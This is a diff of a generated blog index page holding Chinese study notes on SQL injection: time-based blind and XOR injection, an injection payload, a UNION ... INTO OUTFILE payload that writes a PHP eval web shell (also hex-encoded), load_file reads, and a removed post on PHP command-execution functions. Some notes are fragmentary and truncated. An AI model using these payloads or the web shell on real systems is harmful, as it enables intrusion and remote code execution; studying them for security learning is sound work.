@@ -64,6 +64,76 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SQL2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/02/07/SQL2/" class="article-date">
+  <time datetime="2022-02-07T11:37:49.461Z" itemprop="datePublished">2022-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL基础知识"><a href="#SQL基础知识" class="headerlink" title="SQL基础知识"></a>SQL基础知识</h1><h4 id="八、延时注入"><a href="#八、延时注入" class="headerlink" title="八、延时注入"></a>八、延时注入</h4><h5 id="8-1-手动：结合-Burp-Respond"><a href="#8-1-手动：结合-Burp-Respond" class="headerlink" title="8.1 手动：结合 Burp Respond"></a>8.1 手动：结合 Burp Respond</h5><p>当页面上无回显，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返 </p>
+<p>回页面都一样，可考虑延时注入。 </p>
+<p>方法：</p>
+<p>查库 </p>
+<p>查表</p>
+<p>查列</p>
+<p>查字段 </p>
+<h5 id="8-2-脚本"><a href="#8-2-脚本" class="headerlink" title="8.2 脚本"></a>8.2 脚本</h5><p>8.3 过滤sleep的盲注:MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参 数可以是需 </p>
+<p>要执行的次数和表达式。 表达式可以是任何的标量表达式，比如返回值 是标量的子查询或者函 </p>
+<p>数。 该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MDS()函数比 SHAl()函数要快： </p>
+<h5 id="九、regexp-正则匹配"><a href="#九、regexp-正则匹配" class="headerlink" title="九、regexp 正则匹配"></a>九、regexp 正则匹配</h5><p>有两种方法可以创建一个 <code>RegExp</code> 对象：一种是字面量，另一种是构造函数。</p>
+<ul>
+<li><p>字面量</p>
+<p>由斜杠(/)包围而不是引号包围。</p>
+</li>
+<li><p>构造函数的字符串参数</p>
+<p>由引号而不是斜杠包围。</p>
+</li>
+</ul>
+<p>以下三种表达式都会创建相同的正则表达式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ab+c/i; //字面量形式</span><br><span class="line">new RegExp(&#x27;ab+c&#x27;, &#x27;i&#x27;); // 首个参数为字符串模式的构造函数</span><br><span class="line">new RegExp(/ab+c/, &#x27;i&#x27;); // 首个参数为常规字面量的构造函数</span><br></pre></td></tr></table></figure>
+
+<p>Copy to Clipboard</p>
+<p>当表达式被赋值时，字面量形式提供正则表达式的编译（compilation）状态，当正则表达式保持为常量时使用字面量。例如当你在循环中使用字面量构造一个正则表达式时，正则表达式不会在每一次迭代中都被重新编译（recompiled）。</p>
+<p>而正则表达式对象的构造函数，如 <code>new RegExp(&#39;ab+c&#39;)</code> 提供了正则表达式运行时编译（runtime compilation）。如果你知道正则表达式模式将会改变，或者你事先不知道什么模式，而是从另一个来源获取，如用户输入，这些情况都可以使用构造函数。</p>
+<p>措施：手动或者脚本</p>
+<h5 id="十、异或注入"><a href="#十、异或注入" class="headerlink" title="十、异或注入"></a>十、异或注入</h5><p>异或：一种逻辑运算，简言之，相同为假，不同为真，NULL 与任何条件异或结果都为 NULL， mysql 中的符号是 ^ 和 xor。</p>
+<p>在计算机中异或为一种逻辑运算，两个条件相同即为假（0），两个条件不同即为真（1）。</p>
+<p>异或注入可以判别过滤了哪些字符。</p>
+<p>在MySQL中，异或可以用’^’表示。</p>
+<p>用mysql测试一下：</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37873738/article/details/88043659">https://blog.csdn.net/qq_37873738/article/details/88043659</a></p>
+<p>?id=1’^(length(‘union’)&gt;0)# </p>
+<p>如果 union 已被过滤，那么得到的将会是 length(0&gt;0) ，显然是不成立的，那就将会是 </p>
+<p>1’^0 ，得到的为 真，所以将会返回 正常 的页面； </p>
+<p>如果 union 没有被过滤，相反的，将会得到为假的异或，返回的将会是 错误 的页面。 </p>
+<p>由此可以判断某些字符的过滤情况。 </p>
+<p>符号特点： </p>
+<ul>
+<li><p>运算符会做位异或运算</p>
+</li>
+<li><p>xor 做逻辑运算 1 xor 0 会输出 1 ，其它情况输出其余所有数据 </p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/02/07/SQL2/" data-id="ckzcpi8ou000064v3e3yia8e7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-SQL1" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2022/02/06/SQL1/" class="article-date">
@@ -111,7 +181,7 @@
 <p>multipolygon()</p>
 <h3 id="七、文件读写"><a href="#七、文件读写" class="headerlink" title="七、文件读写"></a>七、文件读写</h3><p>7.1 手动 </p>
 <p>写文件1 ?id=-1’ union select 1,”<?php @eval(\$_POST[1]); ?>“,3 into outfile “/var/ww </p>
-<h1 id="可将文件内容转换成十六进制"><a href="#可将文件内容转换成十六进制" class="headerlink" title="可将文件内容转换成十六进制"></a>可将文件内容转换成十六进制</h1><p>?id=-1’ union select ,0x3c3f70687020406576616c28245f504f53545b315d293b203f3 </p>
+<h5 id="可将文件内容转换成十六进制"><a href="#可将文件内容转换成十六进制" class="headerlink" title="可将文件内容转换成十六进制"></a>可将文件内容转换成十六进制</h5><p>?id=-1’ union select ,0x3c3f70687020406576616c28245f504f53545b315d293b203f3 </p>
 <p>有回显时 读取文件 </p>
 <p> ?id=-1’ union select 1,2,load_file(‘/var/www/html/1.php’)–+ </p>
 <p> 文件路径 可使用 十六进制</p>
@@ -1202,135 +1272,6 @@ preg_match('/^*.(flag).*$/',$cmd){
 
 
   
-    <article id="post-web" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/01/19/web/" class="article-date">
-  <time datetime="2022-01-19T07:30:12.135Z" itemprop="datePublished">2022-01-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="web1命令执行"><a href="#web1命令执行" class="headerlink" title="web1命令执行"></a>web1命令执行</h1><h3 id="2-1-rce中常⽤的php代码执⾏函数"><a href="#2-1-rce中常⽤的php代码执⾏函数" class="headerlink" title="2.1 rce中常⽤的php代码执⾏函数"></a>2.1 rce中常⽤的php代码执⾏函数</h3><ul>
-<li>eval() </li>
-</ul>
-<p>执⾏⼀个字符串表达式，该字符串必须是合法的 PHP 代码，且必须以 分号 结尾 </p>
-<p>例： </p>
-<?php 
-
- $a = 199; 
-
- eval("echo\$a;"); #输出：199 
-
-* assert() 
-
-assert 函数 是直接将传⼊的参数当成 PHP代码 直接，不需要以分号结尾，当然你加 上也可以 。
-
-* preg_replace() 
-* 搜索 subject 中匹配 pattern 的部分，以 replacement 进⾏替换。 preg_replace() 函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的 /e修饰符，使 preg_replace 将 replacement 参数当作 PHP 代码
-
-* create_function() 
-
-通过传递的参数创建⼀个匿名函数，并且返回函数的⼀个名字
-
-* array_map() 
-
-为数组的每个元素应⽤回调函数 
-
-array_map()：返回数组，是为 array 每个元素应⽤ callback 函数之后的数 组。 array_map() 返回⼀个 array，数组内容为 array1 的元素按索引顺序为参数调 ⽤ callback 后的结果（有更多数组时，还会传⼊ arrays 的元素）。 callback 函数形参的数量必须匹配 array_map() 实参中数组的数量
-
-* call_user_func()/call_user_func_array() 
-
-call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_func_array() --------调⽤回调函数，并把⼀个数组参数作为回 调函数的参数 
-
-* array_filter() 
-
-使⽤回调函数过滤数组的元素
-
-遍历 array 数组中的每个值，并将每个值传递给 callback 回调函数。 如果 callback 回调函数返回 true ，则将 array 数组中的当前值返回到结果 array 数组中 
-
-* usort()/uasort() 
-
-使⽤⽤户⾃定义的⽐较函数对数组中的值进⾏排序 本函数将⽤⽤户⾃定义的⽐较函数对⼀个数组中的值进⾏排序。 如果要排序的数组需要⽤⼀种不寻常的标准进⾏排序，那么应该使⽤此函数。 
-
-* file_put_contents()/fputs() 
-
-将⼀个字符串写⼊⽂件 
-
-* 动态函数构造:
-
-利⽤⽅式: 
-
-<?php 
-
- a=assert&b=system('ls') 
-
- $_GET['a']($_GET['b']); 
-
- ?><h3 id="2-2-rce中常用的包含文件函数"><a href="#2-2-rce中常用的包含文件函数" class="headerlink" title="2.2 rce中常用的包含文件函数"></a>2.2 rce中常用的包含文件函数</h3><ul>
-<li>include </li>
-</ul>
-<p>当包含 .php ⽂件时，可同时运⾏ </p>
-<ul>
-<li>highlight_fifile </li>
-</ul>
-<p>语法⾼亮⼀个⽂件，即将⽂件内容全部展示出来</p>
-<ul>
-<li>show_source </li>
-</ul>
-<p>highlight_file 的别名  </p>
-<h3 id="2-3-常⻅的系统执⾏函数"><a href="#2-3-常⻅的系统执⾏函数" class="headerlink" title="2.3 常⻅的系统执⾏函数"></a>2.3 常⻅的系统执⾏函数</h3><ul>
-<li>system </li>
-</ul>
-<p>将 字符串 作为 OS命令 去执⾏，并且 ⾃带输出功能 </p>
-<p> system(string $command, int &amp;$return_var = ?): string </p>
-<ul>
-<li>shell_exec() </li>
-</ul>
-<p>通过 shell 环境执⾏命令，并且将完整的输出以字符串的⽅式返回。 只返回字符串，不会进⾏输出 该函数和 反引号 `` 的执⾏效果⼀致 </p>
-<ul>
-<li>exec </li>
-</ul>
-<p>将 字符串 作为 OS命令 去执⾏，但是⾃身 不带输出功能，需要 写⼊ 输出功能的代 码 执⾏⼀个外部程序 exec(string $command, array &amp;$output = ?, int &amp;$return_var = ?): string </p>
-<p>本函数执⾏输⼊ command 的外部程序或外部指令。它的返回字符串只是外部程序执⾏后返回的最后⼀ ⾏；若需要完整的返回字符串，可以使⽤ PassThru() 这个函数。 </p>
-<ul>
-<li>popen </li>
-</ul>
-<p>打开进程⽂件指针 </p>
-<p>popen(string $command , string $mode ): resource </p>
-<p>打开⼀个指向进程的管道，该进程由派⽣给定的 command 命令执⾏⽽产⽣。</p>
-<ul>
-<li>passthru </li>
-</ul>
-<p>执⾏外部程序并且 ⾃带输出功能 </p>
-<p>passthru(string $command , int &amp;$return_var = ?): void </p>
-<p>同 exec() 函数类似， passthru() 函数 也是⽤来执⾏外部命令（ command ）的。 当 所执⾏的 Unix 命令输出⼆进制数据， 并且需要直接传送到浏览器的时候， 需要⽤此函数来替代 exec() 或 system() 函数。 常⽤来执⾏诸如 pbmplus 之类的可以直接输出图 像流的命令。 通过设置 Content-type 为 image/gif ， 然后调⽤pbmplus 程序输出 gif ⽂件， 就可以从 PHP 脚本中直接输出图像到浏览器。 </p>
-<h3 id="2-4-其他命令执⾏函数"><a href="#2-4-其他命令执⾏函数" class="headerlink" title="2.4 其他命令执⾏函数"></a>2.4 其他命令执⾏函数</h3><p> PHP：exec、shell_exec、system、passthru、popen、proc_open等  ASP.NET：System.Diagnostics.Start.Process、System.Diagnostics.Start.ProcessStartInfo等 5 Java：java.lang.runtime.Runtime.getRuntime、java.lang.runtime.Runtime.exec </p>
-<h3 id="2-5-积累"><a href="#2-5-积累" class="headerlink" title="2.5 积累"></a>2.5 积累</h3><p>php 中不需要括号的函数 </p>
-<p>echo 111; </p>
-<p>print 123; </p>
-<p> die; </p>
-<p>include “ “ </p>
-<p> require “ “ </p>
-<p> include_once “ “ </p>
-<p>7require_once “ “ </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/19/web/" data-id="ckyliufbo0000pkv39r6x0qzd" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -1367,6 +1308,10 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
       <ul>
         
           <li>
+            <a href="/2022/02/07/SQL2/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2022/02/06/SQL1/">(no title)</a>
           </li>
         
@@ -1380,10 +1325,6 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
         
           <li>
             <a href="/2022/01/25/web7/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/01/24/web6/">(no title)</a>
           </li>
         
       </ul>
